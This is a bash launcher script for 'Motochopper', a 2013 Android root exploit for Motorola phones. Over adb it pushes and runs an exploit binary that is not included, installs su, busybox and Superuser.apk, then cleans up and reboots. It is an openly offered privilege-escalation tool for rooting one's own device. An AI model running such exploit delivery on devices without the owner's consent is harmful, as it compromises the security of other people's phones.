#!/bin/bash
#########################################################################
#
#  Motochopper: Android root exploit
#  Linux/OS X version
#
#  Copyright (C) 2013 Dan Rosenberg (@djrbliss)
#
#########################################################################
#
# Instructions:
#
#  1. Put your device in debugging mode
#
#  2. Attach it via USB
#
#  3. Run this script in the same directory as the rest of the extracted
#     zipfile
#
#########################################################################

echo "[*]"
echo "[*] Motochopper: Android root exploit (Linux/OS X version)"
echo "[*] v1.1"
echo "[*] by Dan Rosenberg (@djrbliss)"
echo "[*]"
echo "[*] Tested on the Motorola Razr HD, Razr M, Razr Maxx HD, and Atrix HD."
echo "[*] Supports lots of other devices as well. ;-)"
echo "[*]"
echo "[*] Before continuing, ensure that USB debugging is enabled and that"
echo "[*] your phone is connected via USB."
echo "[*]"
echo "[*] WARNING: This will likely void the warranty on your device. I am"
echo "[*] not responsible for any damage to your phone as a result using this"
echo "[*] tool."
echo "[*]"
echo "[*] Press enter to root your phone..."

read -n 1

echo "[*]"

platform=`uname`
if [ $(uname -p) = 'powerpc' ]; then
        echo "[-] PowerPC is not supported."
        exit 1
fi

if [ "$platform" = 'Darwin' ]; then
        adb="./adb.osx"
        version="OS X"
else
        adb="./adb.linux"
        version="Linux"
fi
chmod +x $adb

$adb kill-server

echo "[*] Waiting for device..."
$adb wait-for-device

echo "[*] Device found."

echo "[*] Pushing exploit..."
$adb push pwn /data/local/tmp/
$adb shell chmod 755 /data/local/tmp/pwn

echo "[*] Pushing root tools..."
$adb push su /data/local/tmp/
$adb push busybox /data/local/tmp/
$adb install Superuser.apk

echo "[*] Rooting phone..."
$adb shell /data/local/tmp/pwn

echo "[*] Cleaning up..."
$adb shell rm /data/local/tmp/pwn
$adb shell rm /data/local/tmp/su
$adb shell rm /data/local/tmp/busybox

echo "[*] Exploit complete. Press enter to reboot and exit."
read -n 1
$adb reboot
$adb kill-server
